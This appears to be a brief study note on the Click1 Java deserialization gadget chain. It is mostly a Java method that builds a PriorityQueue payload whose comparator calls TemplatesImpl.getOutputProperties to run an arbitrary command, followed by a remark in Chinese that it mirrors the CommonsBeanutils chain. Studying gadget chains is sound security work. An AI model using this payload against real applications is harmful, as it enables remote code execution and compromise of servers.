# Click1

```java
public Object getObject(final String command) throws Exception {

        // prepare a Column.comparator with mock values
        final Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);
        // create queue with numbers and our comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by the comparator,
        // so it will trigger getOutputProperties() when objects in the queue are compared
        column.setName("outputProperties");

        // finally, we inject and new TemplatesImpl object into the queue,
        // so its getOutputProperties() method will be called
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        final Object templates = Gadgets.createTemplatesImpl(command);
        queueArray[0] = templates;

        return queue;
    }
```

可以看到CB链子是一样的。